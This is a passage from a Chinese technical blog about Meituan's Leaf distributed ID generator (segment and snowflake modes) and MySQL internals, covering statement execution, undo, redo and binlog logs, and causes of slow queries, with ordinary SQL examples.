class="operator">|</span></span><br><span class="line"><span class="operator">|</span> update_time <span class="operator">|</span> <span class="type">timestamp</span>    <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">|</span> <span class="keyword">on</span> <span class="keyword">update</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br></pre></td></tr></table></figure>

<p>重要字段说明：biz_tag用来区分业务，max_id表示该biz_tag目前所被分配的ID号段的最大值，step表示每次分配的号段长度。原来获取ID每次都需要写数据库，现在只需要把step设置得足够大，比如1000。那么只有当1000个号被消耗完了之后才会去重新读写一次数据库。读写数据库的频率从1减小到了1&#x2F;step，大致架构如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038462.png" alt="image"></p>
<p>test_tag在第一台Leaf机器上是1~1000的号段，当这个号段用完时，会去加载另一个长度为step&#x3D;1000的号段，假设另外两台号段都没有更新，这个时候第一台机器新加载的号段就应该是3001~4000。同时数据库对应的biz_tag这条数据的max_id会从3000被更新成4000，更新号段的SQL语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Begin</span></span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">table</span> <span class="keyword">SET</span> max_id<span class="operator">=</span>max_id<span class="operator">+</span>step <span class="keyword">WHERE</span> biz_tag<span class="operator">=</span>xxx</span><br><span class="line"><span class="keyword">SELECT</span> tag, max_id, step <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> biz_tag<span class="operator">=</span>xxx</span><br><span class="line"><span class="keyword">Commit</span></span><br></pre></td></tr></table></figure>

<p>这种模式有以下优缺点：</p>
<p>优点：</p>
<ul>
<li>Leaf服务可以很方便的线性扩展，性能完全能够支撑大多数业务场景。</li>
<li>ID号码是趋势递增的8byte的64位数字，满足上述数据库存储的主键要求。</li>
<li>容灾性高，Leaf服务内部有号段缓存，即使DB宕机，短时间内Leaf仍能正常对外提供服务。</li>
<li>可以自定义max_id的大小，非常方便业务从原有的ID方式上迁移过来。</li>
</ul>
<p>缺点：</p>
<ul>
<li>ID号码不够随机，能够泄露发号数量的信息，不太安全。</li>
<li>TP999数据波动大，当号段使用完之后还是会hang在更新数据库的I&#x2F;O上，tg999数据会出现偶尔的尖刺。</li>
<li>DB宕机会造成整个系统不可用。</li>
</ul>
<h5 id="双buffer优化"><a href="#双buffer优化" class="headerlink" title="双buffer优化"></a>双buffer优化</h5><p>对于第二个缺点，Leaf-segment做了一些优化：</p>
<p>Leaf 取号段的时机是在号段消耗完的时候进行的，也就意味着号段临界点的ID下发时间取决于下一次从DB取回号段的时间，并且在这期间进来的请求也会因为DB号段没有取回来，导致线程阻塞。如果请求DB的网络和DB的性能稳定，这种情况对系统的影响是不大的，但是假如取DB的时候网络发生抖动，或者DB发生慢查询就会导致整个系统的响应时间变慢。</p>
<p>为此，我们希望DB取号段的过程能够做到无阻塞，不需要在DB取号段的时候阻塞请求线程，即当号段消费到某个点时就异步的把下一个号段加载到内存中。而不需要等到号段用尽的时候才去更新号段。这样做就可以很大程度上的降低系统的TP999指标。详细实现如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038791.png" alt="image"></p>
<p>采用双buffer的方式，Leaf服务内部有两个号段缓存区segment。当前号段已下发10%时，如果下一个号段未更新，则另启一个更新线程去更新下一个号段。当前号段全部下发完后，如果下个号段准备好了则切换到下个号段为当前segment接着下发，循环往复。</p>
<ul>
<li>每个biz-tag都有消费速度监控，通常推荐segment长度设置为服务高峰期发号QPS的600倍（10分钟），这样即使DB宕机，Leaf仍能持续发号10-20分钟不受影响。</li>
<li>每次请求来临时都会判断下个号段的状态，从而更新此号段，所以偶尔的网络抖动不会影响下个号段的更新。</li>
</ul>
<h5 id="Leaf高可用容灾"><a href="#Leaf高可用容灾" class="headerlink" title="Leaf高可用容灾"></a>Leaf高可用容灾</h5><p>对于第三点“DB可用性”问题，目前采用一主两从的方式，同时分机房部署，Master和Slave之间采用<strong>半同步方式同步数据</strong>。同时使用公司Atlas数据库中间件(已开源，改名为<a href="http://tech.meituan.com/dbproxy-introduction.html">DBProxy</a>)做主从切换。当然这种方案在一些情况会退化成异步模式，甚至在<strong>非常极端</strong>情况下仍然会造成数据不一致的情况，但是出现的概率非常小。如果你的系统要保证100%的数据强一致，可以选择使用“类Paxos算法”实现的强一致MySQL方案，如MySQL 5.7前段时间刚刚GA的<a href="https://dev.mysql.com/doc/refman/5.7/en/group-replication.html">MySQL Group Replication</a>。但是运维成本和精力都会相应的增加，根据实际情况选型即可。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038815.png" alt="image"></p>
<p>同时Leaf服务分IDC部署，内部的服务化框架是“MTthrift RPC”。服务调用的时候，根据负载均衡算法会优先调用同机房的Leaf服务。在该IDC内Leaf服务不可用的时候才会选择其他机房的Leaf服务。同时服务治理平台OCTO还提供了针对服务的过载保护、一键截流、动态流量分配等对服务的保护措施。</p>
<h4 id="Leaf-snowflake方案"><a href="#Leaf-snowflake方案" class="headerlink" title="Leaf-snowflake方案"></a>Leaf-snowflake方案</h4><p>Leaf-segment方案可以生成趋势递增的ID，同时ID号是可计算的，不适用于订单ID生成场景，比如竞对在两天中午12点分别下单，通过订单id号相减就能大致计算出公司一天的订单量，这个是不能忍受的。 Leaf-snowflake方案可以很好的解决这个问题。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262023049.png" alt="img"></p>
<p>Leaf-snowflake方案完全沿用snowflake方案的bit位设计，即是“1+41+10+12”的方式组装ID号。对于workerID的分配，当服务集群数量较小的情况下，完全可以手动配置。Leaf服务规模较大，动手配置成本太高。所以使用Zookeeper持久顺序节点的特性自动对snowflake节点配置wokerID。Leaf-snowflake是按照下面几个步骤启动的：</p>
<ol>
<li>启动Leaf-snowflake服务，连接Zookeeper，在leaf_forever父节点下检查自己是否已经注册过（是否有该顺序子节点）。</li>
<li>如果有注册过直接取回自己的workerID（zk顺序节点生成的int类型ID号），启动服务。</li>
<li>如果没有注册过，就在该父节点下面创建一个持久顺序节点，创建成功后取回顺序号当做自己的workerID号，启动服务。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262024027.png" alt="image"></p>
<h5 id="弱依赖ZooKeeper"><a href="#弱依赖ZooKeeper" class="headerlink" title="弱依赖ZooKeeper"></a>弱依赖ZooKeeper</h5><p>除了每次会去ZK拿数据以外，也会在本机文件系统上缓存一个workerID文件。当ZooKeeper出现问题，恰好机器出现问题需要重启时，能保证服务能够正常启动。这样做到了对三方组件的弱依赖。一定程度上提高了SLA。</p>
<h5 id="解决时钟问题"><a href="#解决时钟问题" class="headerlink" title="解决时钟问题"></a>解决时钟问题</h5><p>因为这种方案依赖时间，如果机器的时钟发生了回拨，那么就会有可能生成重复的ID号，需要解决时钟回退的问题。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262024180.png" alt="image"></p>
<p>服务启动时首先检查自己是否写过ZooKeeper leaf_forever节点：</p>
<ol>
<li>若写过，则用自身系统时间与leaf_forever&#x2F;${self}节点记录时间做比较，若小于leaf_forever&#x2F;${self}时间则认为机器时间发生了大步长回拨，服务启动失败并报警。</li>
<li>若未写过，证明是新服务节点，直接创建持久节点leaf_forever&#x2F;${self}并写入自身系统时间，接下来综合对比其余Leaf节点的系统时间来判断自身系统时间是否准确，具体做法是取leaf_temporary下的所有临时节点（所有运行中的Leaf-snowflake节点）的服务IP：Port，然后通过RPC请求得到所有节点的系统时间，计算sum(time)&#x2F;nodeSize。</li>
<li>若abs( 系统时间-sum(time)&#x2F;nodeSize ) &lt; 阈值，认为当前系统时间准确，正常启动服务，同时写临时节点leaf_temporary&#x2F;${self} 维持租约。</li>
<li>否则认为本机系统时间发生大步长偏移，启动失败并报警。</li>
<li>每隔一段时间(3s)上报自身系统时间写入leaf_forever&#x2F;${self}。</li>
</ol>
<p>由于强依赖时钟，对时间的要求比较敏感，在机器工作时NTP同步也会造成秒级别的回退，建议可以直接关闭NTP同步。要么在时钟回拨的时候直接不提供服务直接返回ERROR_CODE，等时钟追上即可。<strong>或者做一层重试，然后上报报警系统，更或者是发现有时钟回拨之后自动摘除本身节点并报警</strong>。</p>
<p><strong>从上线情况来看，在2017年闰秒出现那一次出现过部分机器回拨，由于Leaf-snowflake的策略保证，成功避免了对业务造成的影响。</strong></p>
<h4 id="Leaf现状"><a href="#Leaf现状" class="headerlink" title="Leaf现状"></a>Leaf现状</h4><p>Leaf在美团点评公司内部服务包含金融、支付交易、餐饮、外卖、酒店旅游、猫眼电影等众多业务线。目前Leaf的性能在4C8G的机器上QPS能压测到近5w&#x2F;s，TP999 1ms，已经能够满足大部分的业务的需求。每天提供亿数量级的调用量，作为公司内部公共的基础技术设施，必须保证高SLA和高性能的服务.</p>
<h2 id="一条SQL语句在MySQL中如何执行的"><a href="#一条SQL语句在MySQL中如何执行的" class="headerlink" title="一条SQL语句在MySQL中如何执行的"></a>一条SQL语句在MySQL中如何执行的</h2><ul>
<li><p>server层：连接，查询缓存，分析，优化，执行</p>
<ul>
<li><p>连接器：登录数据库，分析权限，建立连接，在连接不断开的情况下，即使管理员修改这个用户的权限也不会生效。</p>
</li>
<li><p>查询缓存（mysql8.0 版本后移除）： 查询缓存主要用来缓存我们所执行的 SELECT 语句以及该语句的结果集。</p>
<p>连接建立后，执行查询语句的时候，会先查询缓存，MySQL 会先校验这个 sql 是否执行过，以 Key-Value 的形式缓存在内存中，Key 是查询语句，Value 是结果集。如果缓存 key 被命中，就会直接返回给客户端，如果没有命中，就会执行后续的操作，完成后也会把结果缓存起来，方便下一次调用。当然在真正执行缓存查询的时候还是会校验用户的权限，是否有该表的查询条件。</p>
<p>MySQL 查询不建议使用缓存，因为查询缓存失效在实际业务场景中可能会非常频繁，假如你对一个表更新的话，这个表上的所有的查询缓存都会被清空。对于不经常更新的数据来说，使用缓存还是可以的。</p>
<p>所以，一般在大多数情况下都是不推荐去使用查询缓存的。</p>
<p>MySQL 8.0 版本后删除了缓存的功能，官方也是认为该功能在实际的应用场景比较少，所以干脆直接删掉了。</p>
</li>
<li><p>分析器：</p>
<ul>
<li><p>词法分析：一条 SQL 语句有多个字符串组成，首先要提取关键字，比如 select，提出查询的表，提出字段名，提出查询条件等等。做完这些操作后，就会进入第二步。</p>
</li>
<li><p>语法分析：主要就是判断你输入的 sql 是否正确，是否符合 MySQL 的语法。</p>
</li>
</ul>
</li>
<li><p>优化器：优化器的作用就是已它认为的最优的执行方案去执行（有时候可能也不是最优），比如多个索引的时候该如何选择索引，多表查询的时候如何选择关联顺序等。</p>
<p>可以说，经过了优化器之后可以说这个语句具体该如何执行就已经定下来。</p>
</li>
<li><p>执行器：当选择了执行方案后,mysql就准备开始执行了,首先执行前会检验该用户有没有权限,如果没有权限,就会返回错误信息,如果有权限,就会去调用引擎的接口,返回接口执行的结果</p>
</li>
</ul>
</li>
<li><p>存储引擎：主要负责数据的存储和读取，采用可以替换的插件式架构，支持 InnoDB、MyISAM、Memory 等多个存储引擎，其中 InnoDB 引擎有自有的日志模块 redolog 模块。<strong>现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始就被当做默认存储引擎了。</strong></p>
</li>
</ul>
<p>MySQL 主要分为 Server 层和引擎层，Server 层主要包括连接器、查询缓存、分析器、优化器、执行器，同时还有一个日志模块（binlog），这个日志模块所有执行引擎都可以共用，redolog 只有 InnoDB 有。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438635.png" alt="img"></p>
<h3 id="一条更新语句执行的顺序"><a href="#一条更新语句执行的顺序" class="headerlink" title="一条更新语句执行的顺序"></a>一条更新语句执行的顺序</h3><p>update T set c&#x3D;c+1 where ID&#x3D;2;</p>
<ul>
<li>执行器先找引擎取 ID&#x3D;2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID&#x3D;2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。如果内存不足，则需要页面置换（最佳置换、先进先出、最近最近未用、时钟置换算法（只有一个访问位）、改进型时钟置换算法（有一个访问和修改位，优先淘汰没有修改过的页面） ）。</li>
<li>执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。</li>
<li>引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。</li>
<li>执行器生成这个操作的binlog，并把 binlog 写入磁盘（FIFS、 最短寻道时间、扫描算法和循环扫描算法）。</li>
<li>执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。</li>
</ul>
<h2 id="Undo-log、-Redo-log、Binary-log"><a href="#Undo-log、-Redo-log、Binary-log" class="headerlink" title="Undo log、 Redo log、Binary log"></a>Undo log、 Redo log、Binary log</h2><h3 id="undo-log和redo-log"><a href="#undo-log和redo-log" class="headerlink" title="undo log和redo log"></a>undo log和redo log</h3><p>在数据库系统中，既有存放数据的文件，也有存放日志的文件。日志在内存中也是有缓存Log buffer，也有磁盘文件log file。MySQL中的日志文件，有这么两类与事务有关：undo日志与redo日志。</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>持久性和原子性可以利用undo log来实现。</p>
<p>原理：为了满足事务的原子性，在操作任何数据之前，首先将数据备份到undo log，然后进行数据的修改。如果出现了错误或者用户执行了ROLLBACK语句，系统可以利用Undo log 中的备份数据将数据恢复到事务开始之前的状态。</p>
<p>数据库写入数据到磁盘之前会把数据先缓存在内存中，事务提交时才会写入磁盘中。</p>
<p>用undo log 实现原子性和持久性的事务的简化过程: </p>
<p>假设有A、B两个数据，值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录B&#x3D;2到undo log buffer.<br> E. 修改B&#x3D;4.<br> F. 将undo log buffer写到磁盘。<br> G. 将数据写到磁盘。<br> H. 事务提交</p>
<ul>
<li><p>如何保证原子性？</p>
<p>在修改数据到磁盘前，会先记录undo log，并将undo log持久化到硬盘</p>
</li>
<li><p>如何保证持久性？</p>
<p>在事务提交之前，把内存中缓存的数据写入磁盘。这样事务提交时，可以确定数据是已经持久化的，不会丢失。</p>
</li>
<li><p>若系统在G和H之间崩溃</p>
<p>此时事务并未提交，需要回滚。而undo log已经被持久化，可以根据undo log来恢复数据</p>
</li>
<li><p>若系统在G之前崩溃</p>
<p>此时数据并未持久化到硬盘，依然保持在事务之前的状态</p>
</li>
</ul>
<p><strong>缺陷：</strong>每个事务提交前将数据和Undo Log写入磁盘，这样会导致大量的磁盘IO，因此性能很低。</p>
<p>如果能够将数据缓存一段时间，就能减少IO提高性能。但是这样就会丧失事务的持久性。因此引入了另外一种机制来实现持久化，即<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>和Undo Log相反，Redo Log记录的是<strong>新数据</strong>的备份。<strong>在事务提交前，只要将Redo Log持久化即可，不需要将数据持久化，减少了IO的次数。</strong></p>
<p>先来看下基本原理：</p>
<blockquote>
<p><strong>Undo + Redo事务的简化过程</strong></p>
</blockquote>
<p> 假设有A、B两个数据，值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录A&#x3D;3到redo log buffer.<br> E. 记录B&#x3D;2到undo log buffer.<br> F. 修改B&#x3D;4.<br> G. 记录B&#x3D;4到redo log buffer.<br> H. 将undo log buffer写入redo log buffer<br> I. 将redo log写入磁盘<br> J. 事务提交</p>
<p>K.最后再将数据写回磁盘(不一定立刻写回)</p>
<ul>
<li><p>如何保证原子性？</p>
<p>如果在事务提交前故障，通过undo log日志恢复数据。如果undo log都还没写入，那么数据就尚未持久化，无需回滚</p>
</li>
<li><p>如何保证持久化？</p>
<p>这里并没有出现数据的持久化。因为数据已经写入redo log，而redo log持久化到了硬盘，因此只要到了I以后，事务是可以提交的。</p>
</li>
<li><p>内存中的数据库数据何时持久化到磁盘？</p>
<p>因为redo log已经持久化，因此数据库数据写入磁盘与否影响不大，不过为了避免出现脏数据（内存中与磁盘不一致），事务提交后也会将内存数据刷入磁盘（也可以按照固设定的频率刷新内存数据到磁盘中）。</p>
</li>
<li><p>持久化redo和持久化数据库数据有什么性能差异？</p>
<ul>
<li><p>数据库数据写入是随机IO，性能很差</p>
</li>
<li><p>redo log在初始化时会开辟一段连续的空间，写入是顺序IO，性能很好</p>
</li>
</ul>
</li>
<li><p>redo log中记录的数据，有可能尚未提交，那么如何完成数据恢复？</p>
<p>数据恢复有两种策略：</p>
<ul>
<li>恢复时，只重做已经提交了的事务</li>
<li>恢复时，重做所有事务包括未提交的事务和回滚了的事务。然后通过Undo Log回滚那些未提交的事务</li>
</ul>
<p>Inodb引擎采用的是第二种方案，因此undo log要在 redo log前持久化</p>
</li>
<li><p>写入性能的优化</p>
<p>事务提交前需要同时写入undo log和 redo log，势必增加IO次数，因此实际上undo log并不是直接写入磁盘，而是先写入到redo log中，当redo log持久化时，undo log就同时持久化到硬盘了。</p>
<p>因此事务提交前，只需要对redo log持久化即可。</p>
<p>另外，redo log并不是写入一次就持久化一次，redo log在内存中也有自己的缓冲池：<code>redo log buffer</code>。每次写redo log都是写入到buffer，在提交时一次性持久化到磁盘，减少IO此时。</p>
</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>undo log 记录更新前数据，用于保证事务原子性</li>
<li>redo log 记录更新后数据，用于保证事务的持久性</li>
<li>redo log有自己的内存buffer，先写入到buffer，事务提交时写入磁盘</li>
<li>redo log持久化之后，意味着事务是<strong>可提交</strong>的</li>
</ul>
<h3 id="redo-log日志模块"><a href="#redo-log日志模块" class="headerlink" title="redo log日志模块"></a>redo log日志模块</h3><p>redo log是InnoDB存储引擎层的日志，又称重做日志文件，用于记录事务操作的变化，记录的是数据修改之后的值，不管事务是否提交都会记录下来。在实例和介质失败（media failure）时，redo log文件就能派上用场，如数据库掉电，InnoDB存储引擎会使用redo log恢复到掉电前的时刻，以此来保证数据的完整性。</p>
<p>在一条更新语句进行执行的时候，InnoDB引擎会把更新记录写到redo log日志中，然后更新内存，此时算是语句执行完了，然后在空闲的时候或者是按照设定的更新策略将redo log中的内容更新到磁盘中，这里涉及到WAL即Write Ahead logging技术，他的关键点是先写日志，再写磁盘。</p>
<p>有了redo log日志，那么在数据库进行异常重启的时候，可以根据redo log日志进行恢复，也就达到了crash-safe。</p>
<p>redo log日志的大小是固定的，即记录满了以后就从头循环写。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438630.jpg" alt="img"></p>
<p>该图展示了一组4个文件的redo log日志，checkpoint之前表示擦除完了的，即可以进行写的，擦除之前会更新到磁盘中，write pos是指写的位置，当write pos和checkpoint相遇的时候表明redo log已经满了，这个时候数据库停止进行数据库更新语句的执行，转而进行redo log日志同步到磁盘中。</p>
<h4 id="redo-log机制："><a href="#redo-log机制：" class="headerlink" title="redo log机制："></a>redo log机制：</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438643.jpg" alt="必须了解的mysql三大日志-binlog、redo log和undo log"></p>
<ul>
<li>由两部分组成，一个是内存中的redo log buffer，另一个是磁盘的 redo log file</li>
<li>每次对数据进行修改，先写进buffer中，后续某个时间点再一次将多个操作记录写到redo log file中</li>
<li>三种写入级别<ul>
<li>延迟写，延迟刷新，参数0，适合普通数据，每隔一秒刷新到磁盘一次</li>
<li>实时写，实时刷新，参数1，适合金融数据，写到内存的同时直接刷新到磁盘</li>
<li>实时写，延迟刷新，参数2，适合订单数据，每次提交立马写入os buffer，每隔一秒刷到磁盘</li>
</ul>
</li>
</ul>
<h3 id="binlog日志模块"><a href="#binlog日志模块" class="headerlink" title="binlog日志模块"></a>binlog日志模块</h3><p>binlog是属于MySQL Server层面的，又称为归档日志，属于逻辑日志，是以二进制的形式记录的是这个语句的原始逻辑，依靠binlog是没有crash-safe能力的</p>
<h3 id="redo-log和binlog区别"><a href="#redo-log和binlog区别" class="headerlink" title="redo log和binlog区别"></a>redo log和binlog区别</h3><ul>
<li>redo log是属于innoDB层面，binlog属于MySQL Server层面的，这样在数据库用别的存储引擎时可以达到一致性的要求。</li>
<li>redo log是物理日志，记录该数据页更新的内容；binlog是逻辑日志，记录的是这个更新语句的原始逻辑。</li>
<li>redo log是循环写，日志空间大小固定；binlog是追加写，是指一份写到一定大小的时候会更换下一个文件，不会覆盖。</li>
<li>binlog可以作为恢复数据使用，主从复制搭建，redo log作为异常宕机或者介质故障后的数据恢复使用。</li>
</ul>
<h3 id="redo-log-1"><a href="#redo-log-1" class="headerlink" title="redo log"></a>redo log</h3><p><strong>作用：</strong></p>
<p>确保事务的持久性。防止在发生故障的时间点，尚有脏页未写入磁盘，在重启mysql服务的时候，根据redo log进行重做，从而达到事务的持久性这一特性。</p>
<p>redo log通常是物理日志，记录的是数据页的物理修改，而不是某一行或某几行修改成怎样，它用来恢复提交后的物理数据页（恢复数据页，且只能恢复到最后一次提交的位置）。</p>
<h3 id="undo-log-1"><a href="#undo-log-1" class="headerlink" title="undo log"></a>undo log</h3><p><strong>作用：</strong></p>
<p>保存了事务发生之前的数据的一个版本，可以用于回滚，同时可以提供多版本并发控制下的读（MVCC），也即非锁定读。</p>
<p>undo用来回滚行记录到某个版本。undo log一般是逻辑日志，根据每行记录进行记录。</p>
<h3 id="binlog-监听binary-log"><a href="#binlog-监听binary-log" class="headerlink" title="binlog   监听binary log"></a>binlog   监听binary log</h3><p><strong>作用：</strong></p>
<p>用于复制，在主从复制中，从库利用主库上的binlog进行重播，实现主从同步。<br>用于数据库的基于时间点的还原。</p>
<p><a href="https://blog.csdn.net/u012834750/article/details/79533866">https://blog.csdn.net/u012834750/article/details/79533866</a></p>
<p>数据库数据存放的文件称为data file；日志文件称为log file；数据库数据是有缓存的，如果没有缓存，每次都写或者读物理disk，那性能就太低下了。数据库数据的缓存称为data buffer，日志（redo）缓存称为log buffer；既然数据库数据有缓存，就很难保证缓存数据（脏数据）与磁盘数据的一致性。比如某次数据库操作：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> T <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span> <span class="keyword">where</span> ID<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>更新age字段的数据会存放在缓存中，等待存储引擎将age刷新data_file，并返回给业务方更新成功。如果此时数据库宕机，缓存中的数据就丢失了，业务方却以为更新成功了，数据不一致，也没有持久化存储。</p>
<p>上面的问题就可以通过事务的ACID特性来保证。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> T <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span> <span class="keyword">where</span> ID<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>

<p>这样执行后，更新要么成功，要么失败。业务方的返回和数据库data file中的数据保持一致。要保证这样的特性得靠innodb的redo和undo日志。</p>
<p>redo日志、undo日志：</p>
<p>存储引擎也会为redo undo日志开辟内存缓存空间，log buffer。磁盘上的日志文件称为log file，是顺序追加的，性能非常高，注：磁盘的顺序写性能比内存的写性能差不了多少。</p>
<p>undo日志用于记录事务开始前的状态，用于事务失败时的回滚操作；redo日志记录事务执行后的状态，用来恢复未写入data file的已成功事务更新的数据。例如某一事务的事务序号为T1，其对数据X进行修改，设X的原值是5，修改后的值为15，那么Undo日志为&lt;T1, X, 5&gt;，Redo日志为&lt;T1, X, 15&gt;。</p>
<p>事务执行的各个阶段：</p>
<p>（1）写undo日志到log buffer；</p>
<p>（2）执行事务，并写redo日志到log buffer；</p>
<p>（3）如果innodb_flush_log_at_trx_commit&#x3D;1，则将redo日志写到log file，并刷新磁盘。</p>
<p>（4）提交事务。</p>
<p>为什么没有写data file，事务就提交了？</p>
<p>在数据库的世界里，数据从来都不重要，日志才是最重要的，有了日志就有了一切。</p>
<p>因为data buffer中的数据会在合适的时间由存储引擎写入到data file，如果在写入之前，数据库宕机了，根据磁盘的redo日志，完全可以将事务更改的数据恢复。先持久化日志的策略叫做Write Ahead Log，即预写日志。</p>
<p>分析几种异常情况：</p>
<ul>
<li>innodb_flush_log_at_trx_commit&#x3D;2（<a href="http://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=MzU4NjQwNTE5Ng==&mid=2247483681&idx=1&sn=03adfb89521568013f6a1efd9ca1af6a&scene=21%23wechat_redirect">innodb_flush_log_at_trx_commit和sync_binlog参数详解</a>）时，将redo日志写入logfile后，为提升事务执行的性能，存储引擎并没有调用文件系统的sync操作，将日志落盘。如果此时宕机了，那么未落盘redo日志事务的数据是无法保证一致性的。</li>
<li>undo日志同样存在未落盘的情况，可能出现无法回滚的情况。</li>
</ul>
<p>checkpoint：</p>
<p>checkpoint是为了定期将db buffer的内容刷新到data file。当遇到内存不足、db buffer已满等情况时，需要将db buffer中的内容&#x2F;部分内容（特别是脏数据）转储到data file中。在转储时，会记录checkpoint发生的”时刻“。在故障恢复的时候，只需要redo&#x2F;undo最近的一次checkpoint之后的操作。</p>
<p><a href="https://blog.csdn.net/bluejoe2000/article/details/80349499">https://blog.csdn.net/bluejoe2000/article/details/80349499</a></p>
<h2 id="一条SQL执行很慢的原因有哪些"><a href="#一条SQL执行很慢的原因有哪些" class="headerlink" title="一条SQL执行很慢的原因有哪些?"></a>一条SQL执行很慢的原因有哪些?</h2><p>分两类讨论</p>
<h3 id="大多数情况正常-只是偶尔出现很慢的情况"><a href="#大多数情况正常-只是偶尔出现很慢的情况" class="headerlink" title="大多数情况正常,只是偶尔出现很慢的情况"></a>大多数情况正常,只是偶尔出现很慢的情况</h3><ol>
<li>数据库在刷脏页</li>
</ol>
<p>刷脏页有4种情况:</p>
<ul>
<li>redolog写满了。</li>
<li>内存不够用了：如果一次查询较多的数据，恰好碰到所查的数据页不在内存中，需要申请内存，而此时恰好内存不足的时候就需要淘汰一部分内存数据页，如果是干净页，就直接释放，如果恰好是脏页就需要刷脏页。</li>
<li>mysql认为系统空闲的时候。</li>
<li>mysql正常关闭的时候。</li>
</ul>
<ol start="2">
<li>拿不到锁</li>
</ol>
<p>刚好这条语句涉及到的表，别人在用，并且加锁了，我们拿不到锁，只能慢慢等待别人释放锁了。或者，表没有加锁，但要使用到的某个一行被加锁了，这个时候，也是没有办法的。</p>
<p>可以用 <strong>show processlist</strong>这个命令来查看当前的状态。</p>
<p>这里可以看出update在等待锁。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262256669.png" alt="image-20220226225645544"></p>
<h3 id="针对一直这么慢的情况"><a href="#针对一直这么慢的情况" class="headerlink" title="针对一直这么慢的情况"></a>针对一直这么慢的情况</h3><p>没用到索引</p>
<p>1.字段没有索引</p>
<p>2.字段有索引,但没有用上</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c <span class="operator">-</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> pow(c,<span class="number">2</span>) <span class="operator">=</span> <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<p>3.数据库算错了索引</p>
<p>通过采样统计，由于统计的失误，导致系统没有走索引，而是走了全表扫描，这也是导致我们 SQL 语句执行的很慢的原因。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> <span class="number">100</span> <span class="operator">&lt;</span> c <span class="keyword">and</span> c <span class="operator">&lt;</span> <span class="number">100000</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><ol>
<li>SQL 查询语句：<code>SELECT * FROM A JOIN B ON A.id = B.id</code>，执行过程性能差，原因可能是什么？</li>
<li>上述 SQL 语句的执行过程是什么？哪里需要建立索引？</li>
<li>在 A.id 还是 B.id 上建立索引呢？</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262325790.jpg" alt="aerith_2-wallpaper-7680x4320"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046164.jpg" alt="beautiful_landscapes_in_the_world-wallpaper-5120x2880"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg" alt="princess_8-wallpaper-3840x2160"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046012.jpg" alt="full_moon_reflection-wallpaper-1920x1080"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046990.jpg" alt="amazing_mountain_milky_way_by_yakub_nihat-wallpaper-2560x1440"></p>
